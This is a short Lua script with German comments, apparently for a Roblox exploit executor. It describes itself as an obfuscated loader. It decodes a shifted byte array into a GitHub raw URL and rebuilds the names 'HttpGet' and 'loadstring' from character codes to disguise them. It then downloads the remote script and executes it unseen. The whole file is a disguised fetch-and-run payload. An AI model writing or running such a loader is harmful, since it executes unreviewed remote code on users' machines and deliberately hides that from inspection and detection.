-- Obfuskierter Loader: rekonstruiert die URL und ruft HttpGet + loadstring zur Laufzeit auf.
-- Original-URL: https://raw.githubusercontent.com/Relix78/UiLibary/main/loader.lua
local encoded = {
  111,123,123,119,122,65,54,54,121,104,126,53,110,112,123,111,124,105,124,53,106,118,117,123,108,117,123,122,53,106,118,116,54,89,108,115,112,127,62,63,54,92,112,83,112,105,104,121,128,54,116,104,112,117,54,115,118,104,107,108,121,53,115,124,104
}
local offset = 7

local function decode(tbl, off)
  local parts = {}
  for i = 1, #tbl do
    parts[i] = string.char((tbl[i] - off) % 256)
  end
  return table.concat(parts)
end

local url = decode(encoded, offset) -- ergibt: https://raw.githubusercontent.com/Relix78/UiLibary/main/loader.lua

-- HttpGet als string rekonstruieren und als Methode aufrufen (game[httpName](game, ...))
local httpName = string.char(72,116,116,112,71,101,116) -- "HttpGet"
local httpFn = game[httpName] or game.HttpGet -- Fallback

-- lade das Skript (mit Timestamp-Parameter)
local ok, response = pcall(function()
  return httpFn(game, url .. "?t=" .. os.time())
end)

if not ok or not response then
  error("Failed to fetch loader script")
end

-- loadstring ebenfalls rekonstruiert aus chars (falls environments mit loadstring verboten: adaptieren)
local loadName = string.char(108,111,97,100,115,116,114,105,110,103) -- "loadstring"
local loader = _G[loadName] or load -- fallback auf load

local f, err = pcall(function()
  local fn = loader(response)
  if type(fn) == "function" then
    fn()
  end
end)
if not f then
  error("Failed to execute loaded script: " .. tostring(err))
end
